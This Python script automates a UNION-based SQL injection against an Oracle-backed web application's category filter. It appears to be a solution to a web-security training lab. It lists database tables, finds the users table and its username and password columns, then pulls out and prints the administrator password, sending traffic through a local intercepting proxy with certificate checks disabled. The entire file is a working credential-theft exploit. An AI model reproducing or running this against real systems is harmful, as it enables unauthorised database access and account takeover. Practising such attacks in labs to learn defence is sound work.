import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def perform_request(url, payload):
    path = "/filter?category=Pets"
    r = requests.get(url + path + payload, verify=False, proxies=proxies)
    return r.text


def sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, null FROM all_tables--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(string=re.compile('^USERS\\_.*'))
    return users_table

def sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name = '%s'--" % users_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(string=re.compile('.*USERNAME.*'))
    password_column = soup.find(string=re.compile('.*PASSWORD.*'))
    return username_column, password_column

def sqli_administrator_credentials(url, users_table, username_column, password_column):
    sql_payload = "' UNION SELECT %s, %s FROM %s--" %(username_column, password_column, users_table)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.body.find(string="administrator").parent.find_next('td').contents[0] 
    return admin_password


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("Looking For users table...")
    users_table = sqli_users_table(url)
    if users_table:
        print("[+] Found the users table name: %s" % users_table)
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print("[+] found username column: %s" % username_column)
            print("[+] found password column: %s" % password_column)

            admin_password = sqli_administrator_credentials(url, users_table, username_column, password_column)
            if admin_password:
                print("[+] The administrator password is: %s " % admin_password)
            else:
                print("[-] Could not find the administrator password")

        else:
            print("[-] Could not find username and/or password columns")
    else:
        print("[-] Could not find the users table")
        